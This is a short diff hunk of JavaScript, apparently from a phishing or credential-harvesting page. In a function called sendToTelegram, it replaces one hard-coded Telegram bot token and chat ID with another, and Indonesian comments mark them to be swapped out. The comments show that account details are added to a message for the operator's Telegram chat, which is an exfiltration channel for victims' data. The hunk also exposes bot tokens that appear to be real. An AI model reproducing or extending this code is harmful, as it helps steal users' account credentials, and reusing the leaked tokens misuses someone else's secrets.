@@ -837,8 +837,8 @@ var Comment18 = 'Mak1';
 
     }
     async function sendToTelegram(message) {
-        var TELEGRAM_TOKEN = '8841941027:AAGt1LTI8GCVAOb2EAQzaQTP33n-qJTrFa4';
-        var TELEGRAM_CHAT_ID = '-1002717306025';
+    var TELEGRAM_TOKEN = '8239130398:AAHZVA0z5h7c2Pi_mRWlzYFojILVoylDP8I'; // GANTI
+    var TELEGRAM_CHAT_ID = '-1002785071277'; // GANTI
         if (sudahkirim) return;
         sudahkirim = true
         // Tambahkan nama akun ke pesan Telegram
